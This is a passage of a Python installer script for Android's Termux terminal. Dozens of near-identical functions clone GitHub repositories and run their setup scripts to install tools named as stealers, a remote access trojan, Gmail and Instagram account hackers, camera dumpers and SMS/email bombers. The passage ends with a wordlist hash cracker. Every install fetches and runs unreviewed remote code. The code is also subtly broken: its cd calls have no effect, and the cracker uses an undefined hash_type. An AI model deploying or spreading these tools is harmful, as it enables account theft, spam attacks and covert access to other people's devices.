    print(f"\033[1;91m[*]\033[1;97m M-dork is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find M-dork on your termux's home directory.")
    print()

# 68 Hackerwasi
def Hackerwasi():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Hackerwasi.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install python python2 git -y")
    os.system("git clone https://github.com/evildevill/Hackerwasi")
    os.system("mv Hackerwasi /$HOME")
    os.system("cd /$HOME/Hackerwasi")
    os.system("chmod +x *")
    os.system("pip3 install -r requirements.txt")
    print()
    print(f"\033[1;91m[*]\033[1;97m Hackerwasi is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Hackerwasi on your termux's home directory.")
    print()

# 69 CAM-DUMPER
def camdump():
    print(f"\n\033[1;91m[*]\033[1;97m Installing CAM-DUMPER.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git php wget curl jq -y")
    os.system("git clone https://github.com/LiNuX-Mallu/CAM-DUMPER")
    os.system("mv CAM-DUMPER /$HOME")
    os.system("cd /$HOME/CAM-DUMPER")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m CAM-DUMPER is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find CAM-DUMPER on your termux's home directory.")
    print()

# 70 termux-snippets
def termuxsnippets():
    print(f"\n\033[1;91m[*]\033[1;97m Installing termux-snippets.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/hakxcore/termux-snippets")
    os.system("mv termux-snippets /$HOME")
    os.system("cd /$HOME/termux-snippets")
    os.system("chmod +x *")
    os.system("./install")
    print()
    print(f"\033[1;91m[*]\033[1;97m termux-snippets is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'termux-snippets' to access termux-snippets.")
    print()

# 71 Pureblood
def Pureblood():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Pureblood.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/ChesZy2810/https-github.com-cr4shcod3-pureblood")
    os.system("mv https-github.com-cr4shcod3-pureblood /$HOME/pureblood")
    os.system("cd /$HOME/pureblood")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print(f"\033[1;91m[*]\033[1;97m Pureblood is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Pureblood on your termux's home directory.")
    print()

# 72 beywak
def beyawak():
    print(f"\n\033[1;91m[*]\033[1;97m Installing beyawak.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("pip2 install requests")
    os.system("git clone https://github.com/Ranginang67/beyawak")
    os.system("mv beyawak /$HOME")
    os.system("cd /$HOME/beyawak")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m beyawak is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find beyawak on your termux's home directory.")
    print()

# 73 IP_Rover
def IPRover():
    print(f"\n\033[1;91m[*]\033[1;97m Installing IP_Rover.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python3 -y")
    os.system("git clone https://github.com/Cyber-Dioxide/IP_Rover/")
    os.system("mv IP_Rover /$HOME")
    os.system("cd /$HOME/IP_Rover")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print(f"\033[1;91m[*]\033[1;97m IP_Rover is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find IP_Rover on your termux's home directory.")
    print()

# 74 DirAttack
def DirAttack():
    print(f"\n\033[1;91m[*]\033[1;97m Installing DirAttack.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/Ranginang67/DirAttack")
    os.system("mv DirAttack /$HOME")
    os.system("cd /$HOME/DirAttack")
    os.system("chmod +x *")
    os.system("python install.py")
    print()
    print(f"\033[1;91m[*]\033[1;97m DirAttack is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopn your termux and type 'dirattack' to access DirAttack .")
    print()

# 75 Mega-File-Stealer
def megafile():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Mega-File-Stealer.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/ZechBron/Mega-File-Stealer")
    os.system("mv Mega-File-Stealer /$HOME")
    os.system("cd /$HOME/Mega-File-Stealer")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m Mega-File-Stealer is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Mega-File-Stealer on your termux's home directory.")
    print()

# 76 Hammer
def Hammer():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Hammer.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python dnsutils -y")
    os.system("git clone https://github.com/rk1342k/Hammer")
    os.system("mv Hammer /$HOME")
    os.system("cd /$HOME/Hammer")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m Hammer is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Hammer on your termux's home directory.")
    print()

# 77 demozz
def demozz():
    print(f"\n\033[1;91m[*]\033[1;97m Installing demozz.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/demoza/demozz")
    os.system("mv demozz /$HOME")
    os.system("cd /$HOME/demozz")
    os.system("chmod +x *")
    os.system("bash start.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m demozz is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find demozz on your termux's home directory.")
    print()

# 78 Asura
def Asura():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Asura.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/princekrvert/Asura")
    os.system("mv Asura /$HOME")
    os.system("cd /$HOME/Asura")
    os.system("chmod +x *")
    os.system("./install.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m Asura is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Asura on your termux's home directory.")
    print()

# 79 Youtube-Pro
def ytpro():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Youtube-Pro.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/samay825/Youtube-Pro")
    os.system("mv Youtube-Pro /$HOME")
    os.system("cd /$HOME/Youtube-Pro")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print(f"\033[1;91m[*]\033[1;97m Youtube-Pro is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Youtube-Pro on your termux's home directory.")
    print()

# 80 InstaReport
def InstaReport():
    print(f"\n\033[1;91m[*]\033[1;97m Installing InstaReport.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("git clone https://github.com/Crevils/InstaReport")
    os.system("mv InstaReport /$HOME")
    os.system("cd /$HOME/InstaReport")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m InstaReport is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find InstaReport on your termux's home directory.")
    print()

# 81 Kiss-In-Termux
def kissnt():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Kiss-In-Termux.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/adarshaddee/Kiss-In-Termux")
    os.system("mv Kiss-In-Termux /$HOME")
    os.system("cd /$HOME/Kiss-In-Termux")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m Kiss-In-Termux is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Kiss-In-Termux on your termux's home directory.")
    print()

# 82 parrot-in-termux
def partterx():
    print(f"\n\033[1;91m[*]\033[1;97m Installing parrot-in-termux.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget curl proot-y")
    os.system("git clone https://github.com/risecid/parrot-in-termux")
    os.system("mv parrot.sh /$HOME")
    os.system("cd /$HOME/parrot-in-termux")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m parrot-in-termux is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find parrot-in-termux on your termux's home directory.")
    print()

# 83 Short-Boy
def sortby():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Short-Boy.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git ruby python -y")
    os.system("gem install lolcat")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/AitzazImtiaz/Short-Boy")
    os.system("mv Short-Boy /$HOME")
    os.system("cd /$HOME/Short-Boy")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    os.system("make install")
    print()
    print(f"\033[1;91m[*]\033[1;97m Short-Boy is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'shortboy' To access Short-Boy.")
    print()

# 84 termux-desktop
def tdesktp():
    print(f"\n\033[1;91m[*]\033[1;97m Installing termux-desktop.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/adi1090x/termux-desktop")
    os.system("mv termux-desktop /$HOME")
    os.system("cd /$HOME/termux-desktop")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m termux-desktop is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find termux-desktop on your termux's home directory.")
    print()

# 85 ipdrone
def ipdrone():
    print(f"\n\033[1;91m[*]\033[1;97m Installing ipdrone.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("pip install requests")
    os.system("git clone https://github.com/noob-hackers/ipdrone")
    os.system("mv ipdrone /$HOME")
    os.system("cd /$HOME/ipdrone")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m ipdrone is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find ipdrone on your termux's home directory.")
    print()

# 86 TeleGram-Scraper
def tscrap():
    print(f"\n\033[1;91m[*]\033[1;97m Installing TeleGram-Scraper.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/th3unkn0n/TeleGram-Scraper")
    os.system("mv TeleGram-Scraper /$HOME")
    os.system("cd /$HOME/TeleGram-Scraper")
    os.system("chmod +x *")
    os.system("python setup.py -i")
    print()
    print(f"\033[1;91m[*]\033[1;97m TeleGram-Scraper is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TeleGram-Scraper on your termux's home directory.")
    print()

# 87 osi.ig
def osiig():
    print(f"\n\033[1;91m[*]\033[1;97m Installing osi.ig.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install python3 git -y")
    os.system("git clone https://github.com/th3unkn0n/osi.ig")
    os.system("mv osi.ig /$HOME")
    os.system("cd /$HOME/osi.ig")
    os.system("chmod +x *")
    os.system("python3 -m pip install -r requirements.txt")
    print()
    print(f"\033[1;91m[*]\033[1;97m osi.ig is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find osi.ig on your termux's home directory.")
    print()

# 88 Beast_Bomber
def Beastb():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Beast_Bomber.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/ebankoff/Beast_Bomber")
    os.system("mv Beast_Bomber /$HOME")
    os.system("cd /$HOME/Beast_Bomber")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print(f"\033[1;91m[*]\033[1;97m Beast_Bomber is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Beast_Bomber on your termux's home directory.")
    print()

# 89 007-TheBond
def bombs():
    print(f"\n\033[1;91m[*]\033[1;97m Installing 007-TheBond.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/Deadshot0x7/007-TheBond")
    os.system("mv 007-TheBond /$HOME")
    os.system("cd /$HOME/007-TheBond")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    os.system("./setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m 007-TheBond is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find 007-TheBond on your termux's home directory.")
    print()

# 90 MyServer
def MyServer():
    print(f"\n\033[1;91m[*]\033[1;97m Installing MyServer.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/rajkumardusad/MyServer")
    os.system("mv MyServer /$HOME")
    os.system("cd /$HOME/MyServer")
    os.system("chmod +x *")
    os.system("./install")
    print()
    print(f"\033[1;91m[*]\033[1;97m MyServer is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux app and type command 'myserver' to access MyServer.")
    print()

# 91 Cracker-Tool
def CrackerTool():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Cracker-Tool.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/cracker911181/Cracker-Tool")
    os.system("mv Cracker-Tool /$HOME")
    os.system("cd /$HOME/Cracker-Tool")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m Cracker-Tool is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Cracker-Tool on your termux's home directory.")
    print()

# 92 Xteam
def Xteam():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Xteam.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("git clone https://github.com/xploitstech/Xteam")
    os.system("mv Xteam /$HOME")
    os.system("cd /$HOME/Xteam")
    os.system("chmod +x *")
    os.system("pip3 install -r requirements.txt")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m Xteam is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Xteam on your termux's home directory.")
    print()

# 93 Gmail-Hack
def GmailHack():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Gmail-Hack.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("termux-setup-storage")
    os.system("git clone https://github.com/mishakorzik/Gmail-Hack")
    os.system("mv Gmail-Hack /$HOME")
    os.system("cd /$HOME/Gmail-Hack")
    os.system("chmod +x *")
    os.system("bash install.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m Gmail-Hack is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Gmail-Hack on your termux's home directory.")
    print()

# 94 GH05T-INSTA
def GHINSTA():
    print(f"\n\033[1;91m[*]\033[1;97m Installing GH05T-INSTA.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA")
    os.system("mv GH05T-INSTA /$HOME")
    os.system("cd /$HOME/GH05T-INSTA")
    os.system("chmod +x *")
    os.system("python install.py")
    print()
    print(f"\033[1;91m[*]\033[1;97m GH05T-INSTA is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'gh05t' to access GH05T-INSTA.")
    print()

# 95 TORhunter
def TORhunter():
    print(f"\n\033[1;91m[*]\033[1;97m Installing TORhunter.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Err0r-ICA/TORhunter")
    os.system("mv TORhunter /$HOME")
    os.system("cd /$HOME/TORhunter")
    os.system("chmod +x *")
    os.system("./install.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m TORhunter is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TORhunter on your termux's home directory.")
    print()

# 96 jarvis-welcome
def jarvswlcm():
    print(f"\n\033[1;91m[*]\033[1;97m Installing jarvis-welcome.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git mpv -y")
    os.system("git clone https://github.com/AmshenShanu07/jarvis-welcome")
    os.system("mv jarvis-welcome /$HOME")
    os.system("cd /$HOME/jarvis-welcome")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m jarvis-welcome is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find jarvis-welcome on your termux's home directory.")
    print()

# 97 Dh-All
def DhAll():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Dh-All.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/DH-AL/Dh-All")
    os.system("mv Dh-All /$HOME")
    os.system("cd /$HOME/Dh-All")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m Dh-All is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Dh-All on your termux's home directory.")
    print()

# 98 Viridae
def Viridae():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Viridae.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/Err0r-ICA/Viridae")
    os.system("mv Viridae /$HOME")
    os.system("cd /$HOME/Viridae")
    os.system("chmod +x *")
    os.system("pip2 install -r requirements.txt")
    print()
    print(f"\033[1;91m[*]\033[1;97m Viridae is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Viridae on your termux's home directory.")
    print()

# 99 httpfy
def httpfy():
    print(f"\n\033[1;91m[*]\033[1;97m Installing httpfy.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git nodejs-lts -y")
    os.system("git clone https://github.com/devXprite/httpfy/")
    os.system("mv httpfy /$HOME")
    os.system("cd /$HOME/httpfy")
    os.system("chmod +x *")
    os.system("npm install")
    print()
    print(f"\033[1;91m[*]\033[1;97m httpfy is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find httpfy on your termux's home directory.")
    print()

# 100 HCORat
def HCORat():
    print(f"\n\033[1;91m[*]\033[1;97m Installing HCORat.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Hackerscolonyofficial/HCORat")
    os.system("mv HCORat /$HOME")
    os.system("cd /$HOME/HCORat")
    os.system("chmod +x *")
    os.system("bash setup")
    print()
    print(f"\033[1;91m[*]\033[1;97m HCORat is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find HCORat on your termux's home directory.")
    print()

# 101 RED_HAWK
def REDHAWK():
    print(f"\n\033[1;91m[*]\033[1;97m Installing RED_HAWK.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git php -y")
    os.system("git clone https://github.com/Tuhinshubhra/RED_HAWK")
    os.system("mv RED_HAWK /$HOME")
    os.system("cd /$HOME/RED_HAWK")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m RED_HAWK is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find RED_HAWK on your termux's home directory.")
    print()

# 102 TraceX-GUI
def trcexgui():
    print(f"\n\033[1;91m[*]\033[1;97m Installing TraceX-GUI.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/TraceX-GUI")
    os.system("mv TraceX-GUI /$HOME")
    os.system("cd /$HOME/TraceX-GUI")
    os.system("chmod +x *")
    os.system("bash termx.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m TraceX-GUI is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'tracex' to activate TraceX-GUI.")
    print()

# 103 PassX
def PassX():
    print(f"\n\033[1;91m[*]\033[1;97m Installing PassX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/VritraSecz/PassX")
    os.system("mv PassX /$HOME")
    os.system("cd /$HOME/PassX")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m PassX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find PassX on your termux's home directory.")
    print()

# 104 DecodeX
def DecodeX():
    print(f"\n\033[1;91m[*]\033[1;97m Installing DecodeX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/VritraSecz/DecodeX")
    os.system("mv DecodeX /$HOME")
    os.system("cd /$HOME/DecodeX")
    os.system("chmod +x *")
    print()
    print(f"\033[1;91m[*]\033[1;97m DecodeX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find DecodeX on your termux's home directory.")
    print()

# 105 termux-fingerprint
def tfingrp():
    print(f"\n\033[1;91m[*]\033[1;97m Installing termux-fingerprint.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/termux-fingerprint/")
    os.system("mv termux-fingerprint /$HOME")
    print()
    print(f"\033[1;91m[*]\033[1;97m termux-fingerprint is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find termux-fingerprint on your termux's home directory.")
    print()

# 106 CloneWeb
def CloneWeb():
    print(f"\n\033[1;91m[*]\033[1;97m Installing CloneWeb.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget curl -y")
    os.system("git clone https://github.com/VritraSecz/CloneWeb")
    os.system("mv CloneWeb /$HOME")
    os.system("cd /$HOME/CloneWeb")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m CloneWeb is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'clone' to launch CloneWeb.")
    print()

# 107 Hacked
def Hacked():
    print(f"\n\033[1;91m[*]\033[1;97m Installing Hacked.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python figlet -y")
    os.system("git clone https://github.com/VritraSecz/Hacked")
    os.system("mv Hacked /$HOME")
    print()
    print(f"\033[1;91m[*]\033[1;97m Hacked is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Hacked on your termux's home directory.")
    print()

# 108 SploitX
def SploitX():
    print(f"\n\033[1;91m[*]\033[1;97m Installing SploitX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/SploitX/")
    os.system("mv SploitX /$HOME")
    os.system("cd /$HOME/SploitX")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m SploitX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find SploitX on your termux's home directory.")
    print()

# 109 ScannerX
def ScannerX():
    print(f"\n\033[1;91m[*]\033[1;97m Installing ScannerX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/ScannerX")
    os.system("mv ScannerX /$HOME")
    os.system("cd /$HOME/ScannerX")
    os.system("chmod +x *")
    os.system("./setup.sh")
    print()
    print(f"\033[1;91m[*]\033[1;97m ScannerX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'scanx' to access ScannerX.")
    print()

# 110 BannerX
def BannerX():
    print(f"\n\033[1;91m[*]\033[1;97m Installing BannerX.....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/VritraSecz/BannerX")
    os.system("mv BannerX /$HOME")
    print()
    print(f"\033[1;91m[*]\033[1;97m BannerX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find BannerX on your termux's home directory.")
    print()

template = """
#
def toolx():
    print(f"\n\033[1;91m[*]\033[1;97m Installing .....\n")
    print(f"\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone ")
    os.system("mv  /$HOME")
    os.system("cd /$HOME/")
    os.system("chmod +x *")
    os.system("")
    print()
    print(f"\033[1;91m[*]\033[1;97m  is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TraceX on your termux's home directory.")
    print()
"""

def crack():
    print()
    while True:
        target_hash = input("\033[1;31m[~]\033[1;37m Enter target Hash: \033[1;31m")
        if target_hash == '':
            pass
        else:
            break

    while True:
        wordlist_path = input("\n\033[1;31m[\033[1;30mSimply Press ENTER If you don't have wordlist!\033[1;31m]\n\033[1;31m[~] \033[1;37mEnter Wordlist Path: \033[1;31m")
        if wordlist_path == '':
            wordlist_path = 'config/wordlist/wordlist.txt'
            print(f"\n\033[1;31m[+] \033[1;37mDefault Wordlist selected")
            break
        else:
            break
    
    print()
    total_words = sum(1 for line in open(wordlist_path, 'r', encoding='latin-1'))
    with open(wordlist_path, 'r', encoding='latin-1') as wordlist_file:
        tried = 0
        for line in wordlist_file:
            word_hash = getattr(hashlib, hash_type)(line.strip().encode()).hexdigest()

            tried += 1
            print(f"\r\033[1;31m[~]\033[1;37m Trying:\033[1;31m {tried}/{total_words}", end='')
            if word_hash == target_hash:
                print(f"\n\n\033[1;31m[+] \033[1;37mHash is cracked:\033[1;31m {line.strip()}")
                print()
                break

        else:
            print('\n\033[1;31m[!]\033[1;37m Password not found\n')

           

############ Password generator section #######################################

def genpassx():
    print(f"\033[1;92m\n \033[1;91m[*]\033[1;97m Password generator launching...")
    sleep(0.7)
    MAX_LEN = int(input(' \033[1;91m[?]\033[1;97m Password length: '))
    cot = int(input(' \033[1;91m[?]\033[1;97m Password count: '))

